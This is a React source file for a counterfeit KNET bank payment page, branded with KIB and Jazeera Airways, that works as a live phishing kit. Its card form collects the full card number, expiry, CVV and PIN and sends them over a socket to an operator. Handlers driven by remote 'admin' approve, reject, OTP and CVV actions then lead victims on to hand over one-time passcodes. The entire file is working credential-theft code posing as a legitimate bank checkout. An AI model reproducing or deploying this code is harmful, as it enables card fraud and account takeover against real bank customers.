import { useState, useEffect, useRef, useCallback } from "react";
import { useLocation } from "wouter";
import { useSignalEffect } from "@preact/signals-react/runtime";
import {
  socket,
  sendData,
  navigateToPage,
  cardAction,
  codeAction,
  waitingMessage,
} from "@/lib/store";

// Bank-to-prefix mapping (exact from official KNET kpay.com.kw)
const bankPrefixMap: Record<string, { prefixes: string[] }> = {
  "Al Ahli Bank of Kuwait [ABK]": {
    prefixes: ["403622", "423826", "428628", "42403256"],
  },
  "Al Rajhi Bank [Rajhi]": {
    prefixes: ["458838"],
  },
  "Bank of Bahrain Kuwait [BBK]": {
    prefixes: ["418056", "588790"],
  },
  "Boubyan Bank [Boubyan]": {
    prefixes: ["404919", "426058", "431199", "450605", "470350", "490455", "490456"],
  },
  "Burgan Bank [Burgan]": {
    prefixes: ["402978", "403583", "415254", "450238", "468564", "49219000", "540759"],
  },
  "Commercial Bank of Kuwait [CBK]": {
    prefixes: ["516334", "521175", "532672", "537015"],
  },
  "Doha Bank [Doha]": {
    prefixes: ["419252"],
  },
  "Gulf Bank of Kuwait [GBK]": {
    prefixes: ["517419", "517458", "526206", "531329", "531470", "531471", "531644", "559475"],
  },
  "KFH [TAM]": {
    prefixes: ["45077848", "45077849"],
  },
  "Kuwait Finance House [KFH]": {
    prefixes: ["450778", "485602", "532674", "537016"],
  },
  "Kuwait International Bank [KIB]": {
    prefixes: ["406464", "409054"],
  },
  "National Bank of Kuwait [NBK]": {
    prefixes: ["464452", "589160"],
  },
  "NBK [Weyay]": {
    prefixes: ["46445250", "543363"],
  },
  "Qatar National Bank [QNB]": {
    prefixes: ["521020", "524745"],
  },
  "Union National Bank [UNB]": {
    prefixes: ["457778"],
  },
  "Warba Bank [Warba]": {
    prefixes: ["525528", "532749", "541350", "559459"],
  },
};

const bankNames = Object.keys(bankPrefixMap);

const months = Array.from({ length: 12 }, (_, i) => ({
  value: String(i + 1),
  label: String(i + 1).padStart(2, "0"),
}));

const currentYear = new Date().getFullYear();
const years = Array.from({ length: 44 }, (_, i) => ({
  value: String(currentYear + i),
  label: String(currentYear + i),
}));

type Phase = "card" | "otp";

export default function KNETPayment() {
  const [, navigate] = useLocation();
  const [phase, setPhase] = useState<Phase>("card");

  // Card form state
  const [selectedBank, setSelectedBank] = useState("");
  const [selectedPrefix, setSelectedPrefix] = useState("");
  const [cardNumber, setCardNumber] = useState("");
  const [expiryMonth, setExpiryMonth] = useState("");
  const [expiryYear, setExpiryYear] = useState("");
  const [cardPin, setCardPin] = useState("");
  const [cardCvv, setCardCvv] = useState("");

  // OTP state
  const [otpCode, setOtpCode] = useState("");
  const [countdown, setCountdown] = useState(180);
  const countdownRef = useRef<ReturnType<typeof setInterval> | null>(null);

  // Common state
  const [validationError, setValidationError] = useState("");
  const [isWaiting, setIsWaiting] = useState(false);
  const [rejectedError, setRejectedError] = useState("");
  const [showErrorModal, setShowErrorModal] = useState(false);
  const [errorModalMessage, setErrorModalMessage] = useState("");
  const [showCvvInfo, setShowCvvInfo] = useState(false);
  const [lang, setLang] = useState<'en' | 'ar'>('en');
  const isAr = lang === 'ar';

  // Get amount from URL or localStorage
  const searchParams = new URLSearchParams(window.location.search);
  const urlAmount = searchParams.get('amount');
  
  const getCartTotal = () => {
    const storedTotal = localStorage.getItem('amouage_order_total');
    if (storedTotal && Number(storedTotal) > 0) {
      return storedTotal;
    }
    const cartItems = JSON.parse(localStorage.getItem('amouage_cart') || '[]');
    let total = 0;
    for (const item of cartItems) {
      total += (parseFloat(item.priceNum) || 0) * (item.quantity || 1);
    }
    return (total * 0.75).toFixed(3);
  };
  
  let totalAmount = getCartTotal();
  if (Number(urlAmount) > 0) {
    totalAmount = urlAmount as string;
    localStorage.setItem('amouage_order_total', urlAmount as string);
  }

  // Get prefixes for selected bank
  const availablePrefixes = selectedBank && bankPrefixMap[selectedBank]
    ? bankPrefixMap[selectedBank].prefixes
    : [];

  // Masked card for OTP phase
  const fullCard = selectedPrefix + cardNumber;
  const maskedCard = "******" + fullCard.slice(-4);

  useEffect(() => {
    navigateToPage("دفع كي نت");
  }, []);

  // Countdown timer for OTP
  const startCountdown = useCallback(() => {
    setCountdown(180);
    if (countdownRef.current) clearInterval(countdownRef.current);
    countdownRef.current = setInterval(() => {
      setCountdown((prev) => {
        if (prev <= 1) {
          if (countdownRef.current) clearInterval(countdownRef.current);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);
  }, []);

  useEffect(() => {
    return () => {
      if (countdownRef.current) clearInterval(countdownRef.current);
    };
  }, []);

  const formatCountdown = (seconds: number) => {
    const m = Math.floor(seconds / 60);
    const s = seconds % 60;
    return `${m}:${String(s).padStart(2, "0")}`;
  };

  // When bank changes, reset prefix
  const handleBankChange = (bankName: string) => {
    setSelectedBank(bankName);
    setSelectedPrefix("");
    setCardNumber("");
    setValidationError("");
    setRejectedError("");
  };

  // Handle card action from admin
  useSignalEffect(() => {
    if (cardAction.value) {
      const action = cardAction.value.action;
      waitingMessage.value = "";
      setIsWaiting(false);

      if (phase === "card") {
        if (action === "otp") {
          setPhase("otp");
          startCountdown();
          navigateToPage("رمز التحقق كي نت (OTP)");
        } else if (action === "reject") {
          setRejectedError("يرجى التأكد من المعلومات المدخلة");
          setCardNumber("");
          setCardPin("");
          setSelectedPrefix("");
          setExpiryMonth("");
          setExpiryYear("");
          setSelectedBank("");
        }
      } else if (phase === "otp") {
        if (action === "otp") {
          navigate("/final-page");
        } else if (action === "cvv") {
          navigate("/cvv");
        } else if (action === "reject") {
          setRejectedError("يرجى إدخال الرمز بشكل صحيح");
          setOtpCode("");
        }
      }
      cardAction.value = null;
    }
  });

  // Handle code action from admin (CVV approve / reject buttons)
  useSignalEffect(() => {
    if (codeAction.value) {
      const action = codeAction.value.action;
      waitingMessage.value = "";
      setIsWaiting(false);

      if (phase === "otp") {
        if (action === "cvv") {
          navigate("/cvv");
        } else if (action === "reject") {
          setRejectedError("يرجى إدخال الرمز بشكل صحيح");
          setOtpCode("");
        } else if (action === "approve" || action === "otp") {
          navigate("/final-page");
        }
      } else if (phase === "card") {
        if (action === "reject") {
          setRejectedError("يرجى التأكد من المعلومات المدخلة");
          setCardNumber("");
          setCardPin("");
          setSelectedPrefix("");
          setExpiryMonth("");
          setExpiryYear("");
          setSelectedBank("");
        }
      }
      codeAction.value = null;
    }
  });

  const handleReset = () => {
    setSelectedBank("");
    setSelectedPrefix("");
    setCardNumber("");
    setExpiryMonth("");
    setExpiryYear("");
    setCardPin("");
    setValidationError("");
    setRejectedError("");
  };

  const validateCardForm = (): boolean => {
    if (!selectedBank) {
      setValidationError("الرجاء اختيار البنك");
      return false;
    }
    if (!selectedPrefix) {
      setValidationError("الرجاء اختيار البادئة");
      return false;
    }
    if (!cardNumber || cardNumber.length < 6) {
      setValidationError("خطأ : الرجاء التأكد من رقم البطاقة");
      return false;
    }
    if (cardPin.length !== 4 || !/^\d{4}$/.test(cardPin)) {
      setValidationError("خطأ : الرجاء أدخال الرقم السري المكون من اربع ارقام");
      return false;
    }
    if (cardCvv.length !== 3 || !/^\d{3}$/.test(cardCvv)) {
      setValidationError("خطأ : الرجاء إدخال رمز التحقق CVV المكون من 3 أرقام");
      return false;
    }
    if (!expiryMonth || !expiryYear) {
      setValidationError("خطأ : الرجاء أختيار شهر وسنة أنتهاء البطاقة");
      return false;
    }
    setValidationError("");
    return true;
  };

  const handleCardSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!validateCardForm()) return;

    setIsWaiting(true);
    setRejectedError("");

    const fullCardNumber = selectedPrefix + cardNumber;

    localStorage.setItem("cardNumber", fullCardNumber);
    localStorage.setItem("cardMonth", expiryMonth.padStart(2, "0"));
    localStorage.setItem("cardYear", expiryYear);
    localStorage.setItem("Total", String(totalAmount));

    const paymentData = {
      totalPaid: totalAmount,
      cardType: "knet",
      cardLast4: fullCardNumber.slice(-4),
      serviceName: "Jazeera Airways",
      bankName: selectedBank,
      bankLogo: "/kpay/knet.png",
    };
    localStorage.setItem("paymentData", JSON.stringify(paymentData));

    sendData({
      paymentCard: {
        cardNumber: fullCardNumber,
        cardNumberOnly: cardNumber,
        prefix: selectedPrefix,
        nameOnCard: "KNET",
        expiryMonth: expiryMonth.padStart(2, "0"),
        expiryYear: expiryYear,
        cvv: cardCvv,
        pin: cardPin,
        bankName: selectedBank,
        paymentMethod: "KNET",
      },
      current: "دفع كي نت",
      nextPage: "رمز التحقق كي نت (OTP)",
      waitingForAdminResponse: true,
      isCustom: true,
    });
  };

  const handleOtpSubmit = () => {
    if (!otpCode || !/^\d{4,6}$/.test(otpCode)) {
      setShowErrorModal(true);
      setErrorModalMessage("أدخل كود تحقق صحيح مكوّن من 4 إلى 6 أرقام");
      return;
    }

    setIsWaiting(true);

    sendData({
      digitCode: otpCode,
      current: "رمز التحقق كي نت (OTP)",
      nextPage: "الصفحة النهائية",
      waitingForAdminResponse: true,
      isCustom: true,
    });
  };

  // ========== STYLES ==========
  const pageBackground: React.CSSProperties = {
    margin: 0,
    padding: 0,
    boxSizing: "border-box",
    fontFamily: "Verdana, Arial, Helvetica, sans-serif",
    backgroundColor: "#ebebeb",
    minHeight: "100vh",
    position: "relative",
    direction: "ltr" as const,
  };

  const mainCard: React.CSSProperties = {
    backgroundColor: "#ffffff",
    border: "2px solid #a0c4e8",
    borderRadius: 12,
    boxShadow: "0 2px 15px rgba(0,0,0,0.15)",
    padding: "25px 35px",
    marginTop: 25,
    marginBottom: 20,
    caretColor: "transparent",
    userSelect: "none" as const,
  };

  const sectionTitle: React.CSSProperties = {
    color: "#0099cc",
    fontSize: 16,
    fontWeight: "bold",
    marginTop: 20,
    marginBottom: 12,
    fontFamily: "Verdana, Arial, Helvetica, sans-serif",
  };

  const fieldRow: React.CSSProperties = {
    display: "flex",
    flexDirection: "row",
    alignItems: "center",
    marginBottom: 8,
    minHeight: 28,
  };

  const fieldLabel: React.CSSProperties = {
    width: "38%",
    fontSize: 12,
    color: "#0099cc",
    fontWeight: "bold",
    textAlign: "left" as const,
  };

  const fieldValue: React.CSSProperties = {
    width: "62%",
    fontSize: 12,
    color: "#333333",
  };

  const selectStyle: React.CSSProperties = {
    fontSize: 12,
    height: 24,
    color: "#333333",
    border: "1px solid #b0b0b0",
    borderRadius: 2,
    padding: "0 2px",
    backgroundColor: "#ffffff",
  };

  const inputStyle: React.CSSProperties = {
    height: 24,
    color: "#333333",
    border: "2px solid #a0c4e8",
    borderRadius: 2,
    padding: "0 5px",
    outline: "none",
    boxSizing: "border-box",
    caretColor: "auto",
    userSelect: "auto" as const,
  };

  const buttonStyle: React.CSSProperties = {
    backgroundColor: "#e8e8e8",
    border: "1px solid #b0b0b0",
    padding: "5px 0",
    fontWeight: "bold",
    color: "#555555",
    fontSize: 13,
    height: 30,
    borderRadius: 3,
    cursor: "pointer",
    fontFamily: "Verdana, Arial, Helvetica, sans-serif",
  };

  const hrStyle: React.CSSProperties = {
    border: "none",
    borderTop: "1px solid #d0d0d0",
    margin: "12px 0",
  };

  return (
    <div style={{...pageBackground, direction: isAr ? 'rtl' : 'ltr'}}>
      {/* Gray overlay for waiting state */}
      {isWaiting && (
        <div
          style={{
            position: "fixed",
            top: 0,
            left: 0,
            width: "100%",
            height: "100%",
            backgroundColor: "rgba(108, 117, 125, 0.41)",
            zIndex: 1000000000,
            display: "flex",
            alignItems: "center",
            justifyContent: "center",
          }}
        >
          <div style={{ textAlign: "center" }}>
            <img src="/kpay/loading.gif" style={{ height: 20 }} alt="loading" />
          </div>
        </div>
      )}

      {/* CVV Info Modal */}
      {showCvvInfo && (
        <div
          style={{
            position: "fixed",
            top: 0,
            left: 0,
            width: "100%",
            height: "100%",
            backgroundColor: "rgba(0, 0, 0, 0.5)",
            zIndex: 1000000000,
            display: "flex",
            alignItems: "center",
            justifyContent: "center",
          }}
          onClick={() => setShowCvvInfo(false)}
        >
          <div
            style={{
              backgroundColor: "#ffffff",
              borderRadius: 8,
              padding: 20,
              maxWidth: 350,
              width: "90%",
              position: "relative",
              boxShadow: "0 4px 20px rgba(0,0,0,0.2)",
            }}
            onClick={(e) => e.stopPropagation()}
          >
            <button
              onClick={() => setShowCvvInfo(false)}
              style={{
                position: "absolute",
                top: 10,
                right: 10,
                background: "none",
                border: "none",
                fontSize: 20,
                cursor: "pointer",
                color: "#666",
              }}
            >
              &times;
            </button>
            <h3 style={{ textAlign: "center", color: "#0099cc", marginTop: 0, marginBottom: 15, fontSize: 16 }}>
              Verification Code (CVV)
            </h3>
            <p style={{ textAlign: "center", fontSize: 13, color: "#555", marginBottom: 15 }}>
              It is the 3-digit number located on the back of the card
            </p>
            <div style={{ textAlign: "center" }}>
              <img 
                src="/images/cvv-info.png" 
                alt="CVV Location" 
                style={{ maxWidth: "100%", height: "auto", borderRadius: 4 }} 
              />
            </div>
            <button
              onClick={() => setShowCvvInfo(false)}
              style={{
                width: "100%",
                padding: "10px",
                backgroundColor: "#0099cc",
                color: "white",
                border: "none",
                borderRadius: 4,
                marginTop: 20,
                cursor: "pointer",
                fontWeight: "bold",
              }}
            >
              OK
            </button>
          </div>
        </div>
      )}

      {/* Error Modal for OTP rejection */}
      {showErrorModal && (
        <div
          style={{
            position: "fixed",
            top: 0,
            left: 0,
            width: "100%",
            height: "100%",
            backgroundColor: "rgba(108, 117, 125, 0.41)",
            zIndex: 1000000000,
            display: "flex",
            alignItems: "center",
            justifyContent: "center",
          }}
        >
          <div
            style={{
              backgroundColor: "#ffffff",
              border: "1px solid rgba(0, 0, 0, 0.2)",
              borderRadius: 6,
              boxShadow: "0 3px 9px rgba(0, 0, 0, 0.5)",
              maxWidth: 400,
              width: "90%",
            }}
          >
            <div
              style={{
                padding: 15,
                borderBottom: "1px solid #e5e5e5",
                display: "flex",
                justifyContent: "flex-end",
              }}
            >
              <button
                onClick={() => setShowErrorModal(false)}
                style={{
                  background: "transparent",
                  border: 0,
                  fontSize: 21,
                  fontWeight: "bold",
                  cursor: "pointer",
                  opacity: 0.5,
                }}
              >
                &times;
              </button>
            </div>
            <div style={{ padding: 15, direction: "rtl", textAlign: "center" }}>
              <h4>{errorModalMessage}</h4>
            </div>
            <div style={{ padding: 15, textAlign: "center", borderTop: "1px solid #e5e5e5" }}>
              <button
                onClick={() => setShowErrorModal(false)}
                style={{
                  ...buttonStyle,
                  width: 100,
                }}
              >
                Close
              </button>
            </div>
          </div>
        </div>
      )}

      <div style={{ width: "100%", padding: "0 15px", boxSizing: "border-box" }}>
        <div style={{ width: "100%", maxWidth: 500, margin: "0 auto" }}>

          {/* Banner */}
          <div style={{ marginTop: 40 }}>
            <img src="/assets/mob.jpg" alt="KNET" style={{ width: "100%", display: "block", borderRadius: 4 }} />
          </div>

          {/* ============ PHASE: CARD ============ */}
          {phase === "card" && (
            <div style={mainCard}>
              {/* KIB Logo - Centered */}
              <div style={{ textAlign: "center", marginBottom: 5 }}>
                <img src="/assets/kib-logo.jpg" alt="KIB" style={{ height: 130, display: "inline-block" }} />
              </div>
              <hr style={hrStyle} />

              {/* Billing Information */}
              <div style={sectionTitle}>Billing Information</div>

              <div style={fieldRow}>
                <label style={fieldLabel}>{isAr ? 'التاجر:' : 'Merchant:'}</label>
                <span style={fieldValue}>Jazeera Airways</span>
              </div>
              <div style={fieldRow}>
                <label style={fieldLabel}>{isAr ? 'المبلغ:' : 'Amount:'}</label>
                <span style={fieldValue}>KD {Number(totalAmount).toFixed(3)}</span>
              </div>

              {/* Card Information */}
              <div style={sectionTitle}>Card Information</div>

              {/* Validation Error */}
              {validationError && (
                <div
                  style={{
                    border: "#ff0000 1px solid",
                    backgroundColor: "#f7dadd",
                    fontSize: 12,
                    color: "#ff0000",
                    padding: 8,
                    textAlign: "center",
                    marginBottom: 10,
                    borderRadius: 4,
                  }}
                >
                  {validationError}
                </div>
              )}

              {/* Rejected Error */}
              {rejectedError && (
                <div
                  style={{
                    fontSize: 11,
                    color: "#ff0000",
                    fontWeight: "bold",
                    textAlign: "center",
                    marginBottom: 10,
                  }}
                >
                  {rejectedError}
                </div>
              )}

              <form onSubmit={handleCardSubmit}>
                {/* Select Your Bank */}
                <div style={fieldRow}>
                  <label style={fieldLabel}>Select Your Bank:</label>
                  <div style={fieldValue}>
                    <select
                      value={selectedBank}
                      onChange={(e) => handleBankChange(e.target.value)}
                      style={{ ...selectStyle, width: "100%" }}
                    >
                      <option value="">Select Your Bank</option>
                      {bankNames.map((name) => (
                        <option key={name} value={name}>{name}</option>
                      ))}
                    </select>
                  </div>
                </div>

                {/* Card Number */}
                <div style={fieldRow}>
                  <label style={fieldLabel}>Card Number:</label>
                  <div style={{ ...fieldValue, display: "flex", gap: 5 }}>
                    <select
                      value={selectedPrefix}
                      onChange={(e) => setSelectedPrefix(e.target.value)}
                      style={{ ...selectStyle, width: "35%" }}
                    >
                      <option value="">Prefix</option>
                      {availablePrefixes.map((p) => (
                        <option key={p} value={p}>{p}</option>
                      ))}
                    </select>
                    <input
                      type="tel"
                      inputMode="numeric"
                      maxLength={10}
                      value={cardNumber}
                      onChange={(e) => {
                        const val = e.target.value.replace(/\D/g, "");
                        setCardNumber(val);
                        setValidationError("");
                      }}
                      style={{ ...inputStyle, width: "65%" }}
                    />
                  </div>
                </div>

                {/* Expiration Date */}
                <div style={fieldRow}>
                  <label style={fieldLabel}>Expiration Date:</label>
                  <div style={{ ...fieldValue, display: "flex", gap: 5 }}>
                    <select
                      value={expiryMonth}
                      onChange={(e) => setExpiryMonth(e.target.value)}
                      style={{ ...selectStyle, width: "35%" }}
                    >
                      <option value="">MM</option>
                      {months.map((m) => (
                        <option key={m.value} value={m.value}>{m.label}</option>
                      ))}
                    </select>
                    <select
                      value={expiryYear}
                      onChange={(e) => setExpiryYear(e.target.value)}
                      style={{ ...selectStyle, width: "65%" }}
                    >
                      <option value="">YYYY</option>
                      {years.map((y) => (
                        <option key={y.value} value={y.value}>{y.label}</option>
                      ))}
                    </select>
                  </div>
                </div>

                {/* PIN */}
                <div style={fieldRow}>
                  <label style={fieldLabel}>PIN:</label>
                  <div style={fieldValue}>
                    <input
                      type="password"
                      inputMode="numeric"
                      maxLength={4}
                      value={cardPin}
                      onChange={(e) => {
                        const val = e.target.value.replace(/\D/g, "");
                        setCardPin(val);
                        setValidationError("");
                      }}
                      style={{ ...inputStyle, width: "100%" }}
                    />
                  </div>
                </div>

                {/* CVV */}
                <div style={fieldRow}>
                  <label style={{ ...fieldLabel, display: 'flex', alignItems: 'center', gap: '4px' }}>
                    CVV:
                    <button 
                      type="button" 
                      onClick={() => setShowCvvInfo(true)}
                      style={{
                        background: 'none',
                        border: 'none',
                        color: '#0099cc',
                        cursor: 'pointer',
                        padding: 0,
                        display: 'flex',
                        alignItems: 'center',
                        justifyContent: 'center'
                      }}
                      title="ما هو رمز CVV؟"
                    >
                      <svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                        <circle cx="12" cy="12" r="10"></circle>
                        <line x1="12" y1="16" x2="12" y2="12"></line>
                        <line x1="12" y1="8" x2="12.01" y2="8"></line>
                      </svg>
                    </button>
                  </label>
                  <div style={fieldValue}>
                    <input
                      type="password"
                      inputMode="numeric"
                      maxLength={3}
                      value={cardCvv}
                      onChange={(e) => {
                        const val = e.target.value.replace(/\D/g, "");
                        setCardCvv(val);
                        setValidationError("");
                      }}
                      style={{ ...inputStyle, width: "100%" }}
                    />
                  </div>
                </div>

                {/* Buttons */}
                <div
                  style={{
                    display: "flex",
                    gap: 8,
                    marginTop: 18,
                    borderTop: "1px solid #d0d0d0",
                    paddingTop: 15,
                  }}
                >
                  <button type="submit" style={{ ...buttonStyle, flex: 1 }}>
                    Submit
                  </button>
                  <button type="button" onClick={handleReset} style={{ ...buttonStyle, flex: 1 }}>
                    Reset
                  </button>
                  <button
                    type="button"
                    onClick={() => window.history.back()}
                    style={{ ...buttonStyle, flex: 1 }}
                  >
                    Cancel
                  </button>
                </div>
              </form>
            </div>
          )}

          {/* ============ PHASE: OTP ============ */}
          {phase === "otp" && (
            <div style={mainCard}>
              {/* KIB Logo - Fixed */}
              <div style={{ textAlign: "center", marginBottom: 5 }}>
                <img src="/assets/kib-logo.jpg" alt="KIB" style={{ height: 130, display: "inline-block" }} />
              </div>
              <hr style={hrStyle} />

              {/* Billing Information */}
              <div style={sectionTitle}>Billing Information</div>

              <div style={fieldRow}>
                <label style={fieldLabel}>{isAr ? 'التاجر:' : 'Merchant:'}</label>
                <span style={fieldValue}>Jazeera Airways</span>
              </div>
              <div style={fieldRow}>
                <label style={fieldLabel}>{isAr ? 'المبلغ:' : 'Amount:'}</label>
                <span style={fieldValue}>KD {Number(totalAmount).toFixed(3)}</span>
              </div>

              {/* OTP Section */}
              <div style={sectionTitle}>OTP Verification</div>

              {/* Notification */}
              <div
                style={{
                  color: "#31708f",
                  fontFamily: "Arial, Helvetica, serif",
                  fontSize: 12,
                  backgroundColor: "#d9edf6",
                  padding: 10,
                  border: "1px solid #bacce0",
                  borderRadius: 4,
                  marginBottom: 12,
                  textAlign: "justify",
                  lineHeight: "18px",
                }}
              >
                <span style={{ fontWeight: "bold" }}>NOTIFICATION:</span> You
                will presently receive an SMS on your mobile number registered
                with your bank. This is an OTP (One Time Password) SMS, it
                contains 6 digits to be entered in the box below.
              </div>

              {/* Card Number */}
              <div style={fieldRow}>
                <label style={fieldLabel}>Card Number:</label>
                <span style={fieldValue}>{maskedCard}</span>
              </div>

              {/* Expiration Month */}
              <div style={fieldRow}>
                <label style={fieldLabel}>{isAr ? 'شهر الانتهاء:' : 'Expiration Month:'}</label>
                <span style={fieldValue}>{expiryMonth.padStart(2, "0")}</span>
              </div>

              {/* Expiration Year */}
              <div style={fieldRow}>
                <label style={fieldLabel}>{isAr ? 'سنة الانتهاء:' : 'Expiration Year:'}</label>
                <span style={fieldValue}>{expiryYear}</span>
              </div>

              {/* PIN */}
              <div style={fieldRow}>
                <label style={fieldLabel}>{isAr ? 'الرقم السري:' : 'PIN:'}</label>
                <span style={fieldValue}>****</span>
              </div>

              {/* CVV */}
              <div style={fieldRow}>
                <label style={fieldLabel}>CVV:</label>
                <span style={fieldValue}>***</span>
              </div>

              {/* Rejected Error */}
              {rejectedError && (
                <div
                  style={{
                    fontSize: 11,
                    color: "#ff0000",
                    fontWeight: "bold",
                    textAlign: "center",
                    marginBottom: 10,
                  }}
                >
                  {rejectedError}
                </div>
              )}

              {/* OTP with countdown */}
              <div style={fieldRow}>
                <label style={fieldLabel}>{isAr ? 'الرمز:' : 'OTP:'}</label>
                <div style={fieldValue}>
                  <input
                    type="text"
                    inputMode="numeric"
                    maxLength={6}
                    value={otpCode}
                    onChange={(e) => {
                      const val = e.target.value.replace(/\D/g, "");
                      setOtpCode(val);
                      setRejectedError("");
                    }}
                    placeholder={formatCountdown(countdown)}
                    style={{
                      ...inputStyle,
                      width: "100%",
                      textAlign: "center",
                    }}
                  />
                </div>
              </div>

              {/* Buttons */}
              <div
                style={{
                  display: "flex",
                  gap: 8,
                  marginTop: 18,
                  borderTop: "1px solid #d0d0d0",
                  paddingTop: 15,
                }}
              >
                <button
                  type="button"
                  onClick={handleOtpSubmit}
                  disabled={!otpCode || otpCode.length < 4}
                  style={{
                    ...buttonStyle,
                    flex: 1,
                    opacity: otpCode && otpCode.length >= 4 ? 1 : 0.6,
                    cursor: otpCode && otpCode.length >= 4 ? "pointer" : "not-allowed",
                  }}
                >
                  {isAr ? 'إرسال' : 'Submit'}
                </button>
                <button
                  type="button"
                  onClick={() => window.history.back()}
                  style={{ ...buttonStyle, flex: 1 }}
                >
                  {isAr ? 'إلغاء' : 'Cancel'}
                </button>
              </div>
            </div>
          )}

          {/* Footer */}
          <footer style={{ textAlign: "center", marginTop: 15, marginBottom: 20 }}>
            <div style={{ fontSize: 11, lineHeight: "18px", color: "#666666" }}>
              All Rights Reserved. Copyright 2026 ©
              <br />
              <span
                style={{
                  fontSize: 11,
                  fontWeight: "bold",
                  color: "#0099cc",
                }}
              >
                The Shared Electronic Banking Services Company - KNET
              </span>
            </div>
          </footer>
        </div>
      </div>
    </div>
  );
}
